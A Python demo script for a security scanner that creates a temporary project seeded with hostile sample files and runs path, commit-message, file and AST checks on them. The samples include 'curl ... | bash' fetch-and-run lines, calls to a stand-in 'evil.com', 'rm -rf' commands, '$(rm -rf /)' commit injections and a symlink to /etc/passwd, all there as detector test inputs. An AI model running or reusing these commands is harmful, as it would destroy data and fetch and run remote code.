#!/usr/bin/env python3
"""
Security Manager Demo

Demonstrates the comprehensive security protection capabilities of the SecurityManager
including AST-based Python analysis, path sanitization, symlink detection, and more.
"""

import os
import tempfile
import shutil
from security_manager import SecurityManager


def create_demo_project():
    """Create a demo project with various security risks"""
    demo_dir = tempfile.mkdtemp(prefix="security_demo_")
    project_root = os.path.join(demo_dir, "vulnerable_project")
    os.makedirs(project_root, exist_ok=True)
    
    # Create various files with different risk levels
    files_to_create = {
        # Safe files
        "main.py": """#!/usr/bin/env python3
def main():
    print("Hello, World!")
    return 0

if __name__ == "__main__":
    main()
""",
        
        "README.md": """# Demo Project
This is a safe README file with no security risks.
""",
        
        # Sensitive files
        ".env": """SECRET_KEY=very_secret_key_here
API_KEY=sk-1234567890abcdef
DATABASE_PASSWORD=super_secret_password
""",
        
        "config.py": """# Configuration with sensitive data
password = "admin123"
api_key = "secret_api_key"
token = "bearer_token_here"
""",
        
        # Dangerous Python files
        "malicious.py": """import os
import subprocess

# Dangerous operations
os.system("rm -rf /tmp/test")
subprocess.run("curl http://evil.com/steal", shell=True)
exec("__import__('os').system('whoami')")
eval("dangerous_code_here")
""",
        
        "obfuscated.py": """# This file has syntax errors (potential obfuscation)
def broken_function(
    # Missing closing parenthesis
    print("This is invalid Python"
""",
        
        # Binary/executable files
        "suspicious.exe": b"Binary executable content\x00\x01\x02\x03",
        "script.sh": """#!/bin/bash
rm -rf /important/data
curl http://malicious.com/payload | bash
""",
        
        # Git directory with risky content
        ".git/COMMIT_EDITMSG": """Add new feature $(rm -rf /)
This commit message contains injection attempts.
""",
        
        ".git/config": """[core]
    repositoryformatversion = 0
    filemode = true
""",
    }
    
    # Create files
    for file_path, content in files_to_create.items():
        full_path = os.path.join(project_root, file_path)
        os.makedirs(os.path.dirname(full_path), exist_ok=True)
        
        if isinstance(content, bytes):
            with open(full_path, 'wb') as f:
                f.write(content)
        else:
            with open(full_path, 'w') as f:
                f.write(content)
    
    # Create a dangerous symlink (if possible)
    try:
        symlink_path = os.path.join(project_root, "dangerous_link")
        os.symlink("/etc/passwd", symlink_path)
    except OSError:
        print("Note: Could not create symlink (permissions/platform limitation)")
    
    return demo_dir, project_root


def demo_security_scanning():
    """Demonstrate comprehensive security scanning"""
    print("🔒 Security Manager Demo")
    print("=" * 50)
    
    # Create demo project
    demo_dir, project_root = create_demo_project()
    
    try:
        # Initialize security manager
        security_manager = SecurityManager()
        
        print(f"📁 Created demo project at: {project_root}")
        print()
        
        # 1. Demonstrate path validation
        print("1. Path Validation:")
        test_paths = [
            project_root,
            "../etc/passwd",
            "/etc/passwd",
            "normal/relative/path"
        ]
        
        for path in test_paths:
            is_valid = security_manager.validate_project_path(path)
            status = "✅ Valid" if is_valid else "❌ Invalid"
            print(f"   {path}: {status}")
        print()
        
        # 2. Demonstrate commit message sanitization
        print("2. Commit Message Sanitization:")
        dangerous_messages = [
            "Normal commit message",
            "Fix bug $(rm -rf /)",
            "Add feature `curl evil.com`",
            "Update ${HOME}/.bashrc",
            "Test with ; rm -rf /"
        ]
        
        for message in dangerous_messages:
            sanitized = security_manager.sanitize_commit_message(message)
            print(f"   Original:  {message}")
            print(f"   Sanitized: {sanitized}")
            print()
        
        # 3. Demonstrate comprehensive file scanning
        print("3. Comprehensive Security Scan:")
        
        # Get all files in the project
        all_files = []
        for root, dirs, files in os.walk(project_root):
            for file in files:
                all_files.append(os.path.join(root, file))
        
        print(f"   Scanning {len(all_files)} files...")
        
        # Perform security scan
        report = security_manager.scan_for_security_risks(all_files, project_root)
        
        # Display results
        print(f"   📊 Scan Results:")
        print(f"      Total files scanned: {len(all_files)}")
        print(f"      Files excluded: {report.total_excluded}")
        print(f"      Security violations: {len(report.violations)}")
        print()
        
        if report.symlinks:
            print(f"   🔗 Dangerous symlinks ({len(report.symlinks)}):")
            for symlink in report.symlinks:
                print(f"      - {os.path.relpath(symlink, project_root)}")
            print()
        
        if report.executables:
            print(f"   ⚠️  Executable files ({len(report.executables)}):")
            for exe in report.executables:
                print(f"      - {os.path.relpath(exe, project_root)}")
            print()
        
        if report.sensitive_files:
            print(f"   🔐 Sensitive files ({len(report.sensitive_files)}):")
            for sensitive in report.sensitive_files:
                print(f"      - {os.path.relpath(sensitive, project_root)}")
            print()
        
        if report.git_risks:
            print(f"   🚨 Git security risks ({len(report.git_risks)}):")
            for git_risk in report.git_risks:
                print(f"      - {os.path.relpath(git_risk, project_root)}")
            print()
        
        # Show detailed violations
        if report.violations:
            print("   🔍 Detailed Security Violations:")
            for i, violation in enumerate(report.violations[:5], 1):  # Show first 5
                print(f"      {i}. {violation.violation_type.value.upper()}: {violation.description}")
                print(f"         File: {os.path.relpath(violation.file_path, project_root)}")
                print(f"         Risk: {violation.risk_level.value.upper()}")
                if violation.detected_patterns:
                    print(f"         Patterns: {', '.join(violation.detected_patterns[:3])}")
                print()
            
            if len(report.violations) > 5:
                print(f"      ... and {len(report.violations) - 5} more violations")
                print()
        
        # 4. Generate security summary
        print("4. Security Summary:")
        summary = security_manager.generate_security_summary(report)
        print(f"   {summary}")
        print()
        
        # 5. Demonstrate individual file safety checks
        print("5. Individual File Safety Checks:")
        test_files = [
            os.path.join(project_root, "main.py"),
            os.path.join(project_root, ".env"),
            os.path.join(project_root, "malicious.py"),
            os.path.join(project_root, "suspicious.exe")
        ]
        
        for file_path in test_files:
            if os.path.exists(file_path):
                is_safe = security_manager.is_safe_to_scan(file_path, project_root)
                status = "✅ Safe" if is_safe else "❌ Unsafe"
                rel_path = os.path.relpath(file_path, project_root)
                print(f"   {rel_path}: {status}")
        print()
        
        print("🎉 Security demo completed successfully!")
        print(f"📁 Demo project created at: {project_root}")
        print("   You can examine the files to see the security risks detected.")
        
    finally:
        # Clean up (optional - comment out to keep demo files)
        # shutil.rmtree(demo_dir)
        pass


def demo_ast_analysis():
    """Demonstrate AST-based Python security analysis"""
    print("\n🐍 AST-Based Python Security Analysis Demo")
    print("=" * 50)
    
    security_manager = SecurityManager()
    
    test_codes = {
        "safe_code.py": """
def calculate_fibonacci(n):
    if n <= 1:
        return n
    return calculate_fibonacci(n-1) + calculate_fibonacci(n-2)

result = calculate_fibonacci(10)
print(f"Fibonacci(10) = {result}")
""",
        
        "dangerous_code.py": """
import os
import subprocess

# Multiple security violations
os.system("rm -rf /tmp")
subprocess.run("curl evil.com", shell=True)
exec("malicious_payload")
eval("dangerous_expression")

# Dynamic import
__import__("os").system("whoami")
""",
        
        "obfuscated_code.py": """
# Syntax error - potential obfuscation
def broken_function(
    print("Missing closing parenthesis"
    return "invalid"
""",
    }
    
    for filename, code in test_codes.items():
        print(f"📄 Analyzing {filename}:")
        violations = security_manager.analyze_python_ast(filename, code)
        
        if not violations:
            print("   ✅ No security violations detected")
        else:
            print(f"   ⚠️  Found {len(violations)} security violations:")
            for violation in violations:
                print(f"      - {violation.violation_type.value.upper()}: {violation.description}")
                print(f"        Risk Level: {violation.risk_level.value.upper()}")
                if violation.detected_patterns:
                    print(f"        Patterns: {', '.join(violation.detected_patterns)}")
        print()


if __name__ == "__main__":
    try:
        demo_security_scanning()
        demo_ast_analysis()
    except KeyboardInterrupt:
        print("\n\n⏹️  Demo interrupted by user")
    except Exception as e:
        print(f"\n❌ Demo failed with error: {e}")
        raise